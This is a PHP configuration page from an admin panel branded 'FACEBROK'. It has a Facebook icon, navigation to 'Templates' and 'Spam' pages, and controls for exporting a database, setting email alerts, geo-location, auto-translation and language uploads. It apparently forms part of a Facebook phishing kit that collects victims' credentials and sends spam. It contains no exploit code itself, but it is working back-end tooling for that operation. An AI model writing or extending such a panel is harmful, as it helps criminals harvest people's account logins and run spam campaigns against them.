<?php

	include 'core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
	if($facebrok->check_session()){
		$MSG="";




		if($_GET['action']=="logout"){$facebrok->logout();}
		if($_GET['action']=="change_email"){$MSG=$facebrok->change_email($_POST['email']);}
		if($_GET['action']=="export_database"){$MSG=$facebrok->export_database();}
		if($_GET['action']=="auto-translation-state"){$MSG=$facebrok->change_auto_translation_state($_POST['state']);}
		if($_GET['action']=="auto-geo-state"){$MSG=$facebrok->change_geo_state($_POST['state']);}
		if($_GET['action']=="upload-language"){$MSG=$facebrok->add_new_language();}
		
		
	
		?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><link rel="shortcut icon" href="asses/facebook.ico" />
<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
	<title>FACEBROK Panel - templates</title>
	<link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
</head>
<body>
<!-- Header -->
<div id="header">
	<div class="shell">
		<!-- Logo + Top Nav -->
		<div id="top">
			<h1><img src="asses/facebrok_icon.png"></h1>

		</div>
		<!-- End Logo + Top Nav -->
		<!-- Main Nav -->
		<div id="navigation">
			<ul>
			    <li><a href="index.php" class="active"><span>Dashboard</span></a></li>
			    <li><a href="templates.php"><span>Templates</span></a></li>
			    <li><a href="spammer.php"><span>Spam</span></a></li>
			    <li><a href="config.php"><span>Config</span></a></li>
			    <li><a href="about.php"><span>About</span></a></li>
			    <li><a href="index.php?action=logout"><span>Log out</span></a></li>
			</ul>
		</div>
		<!-- End Main Nav -->
	</div>
</div>
<!-- End Header -->

<!-- Container -->
<div id="container">
	<div class="shell">
		
		<!-- Small Nav -->
		<div class="small-nav">
			<a href="#">config</a>
			<span>&gt;</span>
			CONFIGURATION
		</div>
		<!-- End Small Nav -->
		
		<?php echo $MSG;?>
		

		<br />
		<!-- Main -->
		<div id="main">
			<div class="cl">&nbsp;</div>
			
			<!-- Content -->
			<div id="content">
				
		<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2>CONFIGURATION</h2>
					</div>
					<!-- End Box Head -->
					
						
						<!-- Form -->
						<div class="form">
								<p>
									<form action="config.php?action=export_database" method="post">
									<div class="buttons2"><label>Export DataBase</label>
							<input class="button" value="export" type="submit"></form>
						</div>
						<p>
							<div class="buttons2"><label>Email Alert (check if you have SMTP service)</label>
								<form action="config.php?action=change_email" method="post">
									<input class="field size4" name="email" value="<?php echo $facebrok->get_email_alert();?>" type="text">
									<input class="button" value="save" type="submit">
								</form>
								
							</div>
								
											<p>
							<div class="buttons2"><label>Auto-translation</label>
								<form action="config.php?action=auto-translation-state" method="post">
							<input class="field size4" name="auto-translation" disabled value="<?php echo $facebrok->get_autotranslationstate();?>" type="text">
									<input class="button" name=state value="true" type="submit">
									<input class="button" name=state value="false" type="submit">
								</form>
								
							</div>
																		<p>
							<div class="buttons2"><label>Upload Languages</label>
								Languages installed : <?php echo $facebrok->get_languages_installed(); ?>
								<br><br>
								How to install
								<br>
								1) Copy the languages/en.xml file.<br>
								2) Paste in you desktop with the name of language prefix, example : ru.xml (for russian).<br>
								3) edict it, example (&#60;photos&#62;Фото&#60;/photos&#62;).<br>
								4) Upload and submit.<br>
								<br>
								<form action="config.php?action=upload-language" method="post" enctype="multipart/form-data"> 
							<input class="field size4" name="lang_file" id="lang_file" type="file">
									<input class="button" name=state value="submit" type="submit">
								</form>
								
							</div>
							<p>
							<div class="buttons2"><label>Geo-location</label>
								<form action="config.php?action=auto-geo-state" method="post">
							<input class="field size4" name="auto-translation" disabled value="<?php echo $facebrok->get_geo_state();?>" type="text">
									<input class="button" name=state value="true" type="submit">
									<input class="button" name=state value="false" type="submit">
								</form>
								
							</div>
								</p>
								

				</div>
	</div>
</div>
<!-- End Container -->


</body>
</html>

		<?php }else{header("location: ../croak/");} ?>